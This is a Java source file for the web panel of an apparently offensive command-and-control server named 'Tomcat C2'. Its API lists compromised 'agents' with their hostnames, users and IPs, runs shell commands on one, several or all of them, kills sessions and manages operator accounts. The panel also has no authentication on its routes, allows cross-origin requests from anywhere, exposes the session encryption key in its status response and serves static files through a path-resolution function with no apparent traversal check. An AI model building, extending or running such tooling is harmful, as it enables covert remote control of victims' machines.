package com.tomcat.iface;

import com.google.gson.Gson;
import com.sun.net.httpserver.*;
import com.tomcat.core.db.TeamDatabase;
import com.tomcat.core.event.EventManager;
import com.tomcat.core.event.EventManager.EventType;
import com.tomcat.core.output.Logger;
import com.tomcat.core.server.ListenerMode;
import com.tomcat.core.server.TomcatServer;
import com.tomcat.core.session.Session;
import com.tomcat.utils.ServerConfig;
import java.io.*;
import java.net.*;
import java.nio.file.*;
import java.time.*;
import java.time.format.DateTimeFormatter;
import java.util.*;
import java.util.concurrent.*;

public final class WebApp {

    @FunctionalInterface
    interface RouteHandler {
        String Handle(HttpExchange E) throws Exception;
    }

    private final ServerConfig Config;
    private final ListenerMode ActiveMode;
    private final TeamDatabase Db;
    private final Gson GsonInst = new Gson();
    private final int MaxLogs;
    private final Path BaseDir;

    private TomcatServer Server;
    private HttpServer HttpSrv;
    private Instant ServerStartTime;

    private final List<String> Logs = new CopyOnWriteArrayList<>();

    public WebApp(ServerConfig Config, ListenerMode Mode) {
        this.Config = Config;
        this.ActiveMode = Mode;
        this.MaxLogs = Config.GetMaxLogEntries();
        this.Db = TeamDatabase.Connect(Config);
        this.BaseDir = ResolveBaseDir();
    }

    private Path ResolveBaseDir() {
        Path Cwd = Paths.get("").toAbsolutePath();
        if (Files.exists(Cwd.resolve("config"))) return Cwd;
        try {
            Path Jar = Paths.get(WebApp.class.getProtectionDomain().getCodeSource().getLocation().toURI()).getParent();
            for (Path P : new Path[] { Jar, Jar != null ? Jar.getParent() : null }) if (
                P != null && Files.exists(P.resolve("config"))
            ) return P.toAbsolutePath();
        } catch (Exception Ignored) {}
        return Cwd;
    }

    private Path ResolvePath(String Rel) {
        Path Direct = Paths.get(Rel);
        if (Direct.isAbsolute() && Files.exists(Direct)) return Direct;
        Path FromBase = BaseDir.resolve(Rel);
        if (Files.exists(FromBase)) return FromBase;
        return Paths.get("").toAbsolutePath().resolve(Rel);
    }

    public void Run(String Host, int Port) throws Exception {
        HttpSrv = HttpServer.create(new InetSocketAddress(Host, Port), 100);
        RegisterRoutes();
        HttpSrv.setExecutor(Executors.newFixedThreadPool(20));
        HttpSrv.start();
        Logger.Info("Web Panel Started On http://" + Host + ":" + Port);
        Logger.Info("Static Dir : " + ResolvePath(Config.GetStaticDir()));
        Logger.Info("Template Dir: " + ResolvePath(Config.GetTemplateDir()));
        AddLog("=".repeat(70));
        AddLog("TOMCAT C2 SERVER INITIALIZED — MODE: " + ActiveMode.name());
        AddLog("=".repeat(70));

        Server = new TomcatServer(Config.GetServerHost(), Config.GetServerPort(), ActiveMode, Config);
        Server.AddEventListener(this::OnEvent);
        boolean[] Started = Server.StartServer();
        if (Started[0]) {
            ServerStartTime = Instant.now();
            new Thread(Server::AcceptConnections, "AcceptConnections").start();
        }
    }

    private void RegisterRoutes() {
        HttpSrv.createContext("/api/server/status", E -> Route(E, this::ApiStatus));
        HttpSrv.createContext("/api/server/start", E -> Route(E, this::ApiStart));
        HttpSrv.createContext("/api/server/stop", E -> Route(E, this::ApiStop));
        HttpSrv.createContext("/api/agents", E -> Route(E, this::ApiAgents));
        HttpSrv.createContext("/api/agents/kill", E -> Route(E, this::ApiKill));
        HttpSrv.createContext("/api/command/execute", E -> Route(E, this::ApiExec));
        HttpSrv.createContext("/api/command/broadcast", E -> Route(E, this::ApiBroadcast));
        HttpSrv.createContext("/api/command/broadcastall", E -> Route(E, this::ApiBroadcastAll));
        HttpSrv.createContext("/api/command/history", E -> Route(E, this::ApiCmdHist));
        HttpSrv.createContext("/api/sessions/history", E -> Route(E, this::ApiSessHist));
        HttpSrv.createContext("/api/logs", E -> Route(E, this::ApiLogs));
        HttpSrv.createContext("/api/logs/clear", E -> Route(E, this::ApiLogsClear));
        HttpSrv.createContext("/api/team/operators", E -> Route(E, this::ApiOperators));
        HttpSrv.createContext("/api/team/operators/create", E -> Route(E, this::ApiOpCreate));
        HttpSrv.createContext("/api/team/operators/delete", E -> Route(E, this::ApiOpDelete));
        HttpSrv.createContext("/static/", new StaticHandler());
        HttpSrv.createContext("/", new IndexHandler());
    }

    private void Route(HttpExchange E, RouteHandler H) {
        try {
            E.getResponseHeaders().add("Content-Type", "application/json");
            E.getResponseHeaders().add("Access-Control-Allow-Origin", "*");
            E.getResponseHeaders().add("Access-Control-Allow-Methods", "GET,POST,OPTIONS");
            E.getResponseHeaders().add("Access-Control-Allow-Headers", "Content-Type");
            if (E.getRequestMethod().equalsIgnoreCase("OPTIONS")) {
                E.sendResponseHeaders(200, -1);
                return;
            }
            byte[] Body = H.Handle(E).getBytes("UTF-8");
            E.sendResponseHeaders(200, Body.length);
            try (OutputStream O = E.getResponseBody()) {
                O.write(Body);
            }
        } catch (Exception Ex) {
            try {
                byte[] B = GsonInst.toJson(Map.of("Error", String.valueOf(Ex.getMessage()))).getBytes("UTF-8");
                E.sendResponseHeaders(500, B.length);
                try (OutputStream O = E.getResponseBody()) {
                    O.write(B);
                }
            } catch (IOException Ignored) {}
        }
    }

    private String ApiStatus(HttpExchange E) {
        boolean Up = Server != null && Server.IsRunning();
        Map<String, Object> R = new LinkedHashMap<>();
        R.put("Status", Up ? "Online" : "Offline");
        R.put("Mode", ActiveMode.name());
        R.put("Host", Up ? Server.GetHost() : Config.GetServerHost());
        R.put("Port", Up ? Server.GetPort() : Config.GetServerPort());
        R.put("StartedAt", ServerStartTime != null ? ServerStartTime.getEpochSecond() : 0);
        R.put("Uptime", Uptime());
        R.put("Agents", Up ? Server.GetSessions().Count() : 0);
        R.put("DbOnline", Db.IsConnected());
        R.put("DbType", Config.GetDbType());
        if (Up) R.put("Key", Server.GetKeyBase64());
        return GsonInst.toJson(R);
    }

    private String ApiStart(HttpExchange E) throws Exception {
        if (Server != null && Server.IsRunning()) return GsonInst.toJson(Map.of("Error", "Already running"));
        Map<String, Object> B = Body(E);
        String Host = Str(B, "Host", Config.GetServerHost());
        int Port = Num(B, "Port", Config.GetServerPort());
        Server = new TomcatServer(Host, Port, ActiveMode, Config);
        Server.AddEventListener(this::OnEvent);
        boolean[] R = Server.StartServer();
        if (!R[0]) {
            AddLog("[!] Failed to start server");
            return GsonInst.toJson(Map.of("Error", "Failed to start server"));
        }
        ServerStartTime = Instant.now();
        AddLog("[+] Server started on " + Host + ":" + Port);
        new Thread(Server::AcceptConnections, "AcceptConnections").start();
        return GsonInst.toJson(
            Map.of(
                "Success",
                true,
                "Host",
                Host,
                "Port",
                Port,
                "Mode",
                ActiveMode.name(),
                "StartedAt",
                ServerStartTime.getEpochSecond()
            )
        );
    }

    private String ApiStop(HttpExchange E) {
        if (Server == null || !Server.IsRunning()) return GsonInst.toJson(Map.of("Error", "Not running"));
        Server.StopServer();
        Server = null;
        ServerStartTime = null;
        AddLog("[!] Server stopped");
        return GsonInst.toJson(Map.of("Success", true));
    }

    private String ApiAgents(HttpExchange E) {
        if (Server == null || !Server.IsRunning()) return GsonInst.toJson(Map.of("Agents", Collections.emptyList()));
        List<Map<String, Object>> List = new ArrayList<>();
        for (Session S : Server.GetSessions().GetAll()) {
            Map<String, Object> A = new LinkedHashMap<>();
            A.put("ID", S.GetId());
            A.put("Hostname", S.GetHostname());
            A.put("OS", S.GetOs());
            A.put("User", S.GetUser());
            A.put("Arch", S.GetArch());
            A.put("AgentIP", S.GetAgentIp());
            A.put("AgentName", S.GetAgentName());
            A.put("JoinedAt", S.GetJoinedAt());
            A.put("Type", S.GetSessionType().name());
            A.put("ShellMode", S.GetShellMode());
            A.put("Encrypted", S.IsEncrypted());
            A.put("MtlsEnabled", S.IsMtlsEnabled());
            A.put("Note", Db.GetAgentNote(S.GetId()));
            List.add(A);
        }
        return GsonInst.toJson(Map.of("Agents", List));
    }

    private String ApiKill(HttpExchange E) throws Exception {
        if (Server == null || !Server.IsRunning()) return GsonInst.toJson(Map.of("Error", "Server not running"));
        int Id = Num(Body(E), "AgentId", 0);
        if (Id == 0) return GsonInst.toJson(Map.of("Error", "AgentId required"));
        Server.RemoveSession(Id);
        AddLog("[KILL] Agent-" + Id);
        return GsonInst.toJson(Map.of("Success", true));
    }

    private String ApiExec(HttpExchange E) throws Exception {
        if (Server == null || !Server.IsRunning()) return GsonInst.toJson(Map.of("Error", "Server not running"));
        Map<String, Object> B = Body(E);
        int AgentId = Num(B, "AgentId", 0);
        String Command = Str(B, "Command", "");
        String Operator = Str(B, "Operator", "system");
        if (AgentId == 0 || Command.isEmpty()) return GsonInst.toJson(Map.of("Error", "AgentId and Command required"));
        AddLog("[>] [" + Operator + "] Agent-" + AgentId + " » " + Command);
        String[] R = Server.ExecuteCommand(AgentId, Command);
        boolean Ok = Boolean.parseBoolean(R[0]);
        Db.SaveCommandLog(AgentId, Operator, Command, R[1], Ok);
        AddLog(Ok ? "[+] " + R[1] : "[!] " + R[1]);
        return GsonInst.toJson(Map.of("Success", Ok, "Output", R[1], "Command", Command));
    }

    private String ApiBroadcast(HttpExchange E) throws Exception {
        if (Server == null || !Server.IsRunning()) return GsonInst.toJson(Map.of("Error", "Server not running"));
        Map<String, Object> B = Body(E);
        String Command = Str(B, "Command", "");
        String Operator = Str(B, "Operator", "system");
        @SuppressWarnings("unchecked")
        java.util.List<Object> Raw = (java.util.List<Object>) B.getOrDefault("AgentIds", new ArrayList<>());
        if (Command.isEmpty()) return GsonInst.toJson(Map.of("Error", "Command required"));
        java.util.List<Integer> Ids = new ArrayList<>();
        for (Object O : Raw) {
            try {
                Ids.add((int) Double.parseDouble(O.toString()));
            } catch (Exception Ign) {}
        }
        if (Ids.isEmpty()) return GsonInst.toJson(Map.of("Error", "AgentIds required"));
        AddLog("[BROADCAST] [" + Operator + "] → " + Ids.size() + " agents » " + Command);
        Map<Integer, String[]> Results = Server.BroadcastCommand(Ids, Command);
        Map<String, Object> Out = new LinkedHashMap<>();
        for (Map.Entry<Integer, String[]> En : Results.entrySet()) {
            boolean Ok = Boolean.parseBoolean(En.getValue()[0]);
            Out.put(String.valueOf(En.getKey()), Map.of("Success", Ok, "Output", En.getValue()[1]));
            Db.SaveCommandLog(En.getKey(), Operator, Command, En.getValue()[1], Ok);
        }
        return GsonInst.toJson(Map.of("Success", true, "Results", Out, "Count", Results.size()));
    }

    private String ApiBroadcastAll(HttpExchange E) throws Exception {
        if (Server == null || !Server.IsRunning()) return GsonInst.toJson(Map.of("Error", "Server not running"));
        Map<String, Object> B = Body(E);
        String Command = Str(B, "Command", "");
        String Operator = Str(B, "Operator", "system");
        if (Command.isEmpty()) return GsonInst.toJson(Map.of("Error", "Command required"));
        AddLog("[BROADCAST-ALL] [" + Operator + "] → " + Server.GetSessions().Count() + " agents » " + Command);
        Map<Integer, String[]> Results = Server.BroadcastAll(Command);
        Map<String, Object> Out = new LinkedHashMap<>();
        for (Map.Entry<Integer, String[]> En : Results.entrySet()) {
            boolean Ok = Boolean.parseBoolean(En.getValue()[0]);
            Out.put(String.valueOf(En.getKey()), Map.of("Success", Ok, "Output", En.getValue()[1]));
            Db.SaveCommandLog(En.getKey(), Operator, Command, En.getValue()[1], Ok);
        }
        return GsonInst.toJson(Map.of("Success", true, "Results", Out, "Count", Results.size()));
    }

    private String ApiCmdHist(HttpExchange E) throws Exception {
        Map<String, Object> B = Body(E);
        return GsonInst.toJson(Map.of("History", Db.GetCommandHistory(Num(B, "AgentId", 0), Num(B, "Limit", 100))));
    }

    private String ApiSessHist(HttpExchange E) throws Exception {
        return GsonInst.toJson(Map.of("Sessions", Db.GetSessionHistory(Num(Body(E), "Limit", 100))));
    }

    private String ApiLogs(HttpExchange E) {
        return GsonInst.toJson(Map.of("Logs", new ArrayList<>(Logs)));
    }

    private String ApiLogsClear(HttpExchange E) {
        Logs.clear();
        return GsonInst.toJson(Map.of("Success", true));
    }

    private String ApiOperators(HttpExchange E) {
        return GsonInst.toJson(Map.of("Operators", Db.GetOperators()));
    }

    private String ApiOpCreate(HttpExchange E) throws Exception {
        Map<String, Object> B = Body(E);
        String User = Str(B, "Username", "");
        String Pass = Str(B, "Password", "");
        String Role = Str(B, "Role", "OPERATOR");
        if (User.isEmpty() || Pass.isEmpty()) return GsonInst.toJson(Map.of("Error", "Username and Password required"));
        if (Pass.length() < 8) return GsonInst.toJson(Map.of("Error", "Password must be at least 8 characters"));
        TeamDatabase.OperatorRole R = TeamDatabase.OperatorRole.FromString(Role);
        if (!Db.CreateOperator(User, TeamDatabase.HashPassword(Pass), R)) return GsonInst.toJson(
            Map.of("Error", "Username already exists")
        );
        AddLog("[TEAM] Operator created: " + User + " [" + R + "]");
        return GsonInst.toJson(Map.of("Success", true, "Username", User, "Role", R.name()));
    }

    private String ApiOpDelete(HttpExchange E) throws Exception {
        String User = Str(Body(E), "Username", "");
        if (User.isEmpty()) return GsonInst.toJson(Map.of("Error", "Username required"));
        if (User.equals("admin")) return GsonInst.toJson(Map.of("Error", "Cannot delete admin"));
        boolean Del = Db.DeleteOperator(User);
        if (Del) AddLog("[TEAM] Operator deleted: " + User);
        return GsonInst.toJson(Map.of("Success", Del));
    }

    private void OnEvent(EventType Type, Map<String, Object> Data) {
        switch (Type) {
            case AgentConnected -> {
                AddLog(
                    "[+] Session-" +
                    Data.get("ID") +
                    " [" +
                    Data.get("Type") +
                    "] " +
                    Data.get("User") +
                    "@" +
                    Data.get("Hostname") +
                    " " +
                    Data.get("OS")
                );
                Db.SaveSessionEvent(Data, "connected");
            }
            case AgentDisconnected -> {
                AddLog("[!] Session-" + Data.get("ID") + " disconnected: " + Data.get("Reason"));
                Db.SaveSessionEvent(Data, "disconnected");
            }
            case Error -> AddLog("[!] " + Data.get("Message"));
        }
    }

    private void AddLog(String Msg) {
        String Entry = "[" + LocalDateTime.now().format(DateTimeFormatter.ofPattern("HH:mm:ss")) + "] " + Msg;
        Logs.add(Entry);
        if (Logs.size() > MaxLogs) Logs.remove(0);
        Db.SaveLog(Entry);
    }

    private String Uptime() {
        if (ServerStartTime == null) return "00:00:00";
        long S = Duration.between(ServerStartTime, Instant.now()).getSeconds();
        return String.format("%02d:%02d:%02d", S / 3600, (S % 3600) / 60, S % 60);
    }

    @SuppressWarnings("unchecked")
    private Map<String, Object> Body(HttpExchange E) throws Exception {
        try (InputStream Is = E.getRequestBody()) {
            String S = new String(Is.readAllBytes(), "UTF-8");
            if (S.isEmpty()) return new HashMap<>();
            return GsonInst.fromJson(S, Map.class);
        }
    }

    private static String Str(Map<String, Object> M, String K, String Def) {
        Object V = M.get(K);
        return V != null ? V.toString() : Def;
    }

    private static int Num(Map<String, Object> M, String K, int Def) {
        try {
            return (int) Double.parseDouble(M.getOrDefault(K, Def).toString());
        } catch (Exception E) {
            return Def;
        }
    }

    class IndexHandler implements HttpHandler {

        @Override
        public void handle(HttpExchange E) throws IOException {
            Path Tpl = ResolvePath(Config.GetTemplateDir() + "/index.html");
            if (!Files.exists(Tpl)) {
                byte[] B = "404 index.html not found".getBytes();
                E.sendResponseHeaders(404, B.length);
                try (OutputStream O = E.getResponseBody()) {
                    O.write(B);
                }
                return;
            }
            E.getResponseHeaders().add("Content-Type", "text/html; charset=UTF-8");
            byte[] Data = Files.readAllBytes(Tpl);
            E.sendResponseHeaders(200, Data.length);
            try (OutputStream O = E.getResponseBody()) {
                O.write(Data);
            }
        }
    }

    class StaticHandler implements HttpHandler {

        @Override
        public void handle(HttpExchange E) throws IOException {
            String ReqPath = E.getRequestURI().getPath();
            String Rel = ReqPath.startsWith("/static/") ? ReqPath.substring(7) : ReqPath;
            Path Target = ResolvePath(Config.GetStaticDir() + Rel);
            if (!Files.exists(Target) || Files.isDirectory(Target)) {
                byte[] B = ("404 Not Found: " + ReqPath).getBytes();
                E.sendResponseHeaders(404, B.length);
                try (OutputStream O = E.getResponseBody()) {
                    O.write(B);
                }
                return;
            }
            E.getResponseHeaders().add("Content-Type", ContentType(Target.toString()));
            byte[] Data = Files.readAllBytes(Target);
            E.sendResponseHeaders(200, Data.length);
            try (OutputStream O = E.getResponseBody()) {
                O.write(Data);
            }
        }

        private String ContentType(String P) {
            if (P.endsWith(".html")) return "text/html; charset=UTF-8";
            if (P.endsWith(".css")) return "text/css";
            if (P.endsWith(".js")) return "application/javascript";
            if (P.endsWith(".json")) return "application/json";
            if (P.endsWith(".png")) return "image/png";
            if (P.endsWith(".svg")) return "image/svg+xml";
            if (P.endsWith(".ico")) return "image/x-icon";
            return "application/octet-stream";
        }
    }
}
